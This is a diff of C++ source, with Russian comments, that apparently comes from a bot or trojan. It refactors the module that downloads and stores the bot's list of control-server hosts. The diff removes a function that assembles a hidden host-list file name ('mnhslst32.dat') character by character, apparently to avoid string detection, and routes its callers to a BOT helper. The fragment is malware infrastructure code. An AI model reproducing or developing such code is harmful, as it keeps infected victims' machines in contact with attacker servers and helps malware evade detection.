@@ -13,6 +13,7 @@
 #include "Config.h"
 
 #include "Config.h"
+#include "StrConsts.h"
 
 #include "Modules.h"
 
@@ -131,16 +132,6 @@ namespace HostsReader
 
 //****************************************************************************
 
-
-PCHAR Hosts::GetFileName()
-{
-	// Функция возвращает имя файла основного списка хостов бота
-	const static char FileName[] = {'m', 'n', 'h', 's', 'l', 's', 't', '3', '2', '.', 'd', 'a', 't',  0};
-
-	return BOT::GetWorkPathInSysDrive(NULL, (PCHAR)FileName);
-
-}
-//---------------------------------------------------------------------------
 
 void FreeHostRecord(LPVOID Data)
 {
@@ -541,7 +532,7 @@ bool Hosts::UpdateHosts(PCHAR Args)
 		if (LoadListFromFile(List, TempFile))
 		{
 			// Сохраняем загруженный список в рабочий файл
-			PCHAR WorkFile = GetFileName();
+			PCHAR WorkFile = BOT::GetHostsFileName();
 			if (WorkFile != NULL)
 			{
 				Result = true;
@@ -582,7 +573,7 @@ bool Hosts::GetActiveHostFormFile(PCHAR FileName, PCHAR &Host, bool *FileExists)
 	bool FreeFileName = false;
 	if (STR::IsEmpty(FileName))
 	{
-		FileName = GetFileName();
+		FileName = BOT::GetHostsFileName();
 		FreeFileName = true;
 	}
 	if (FileName == NULL)
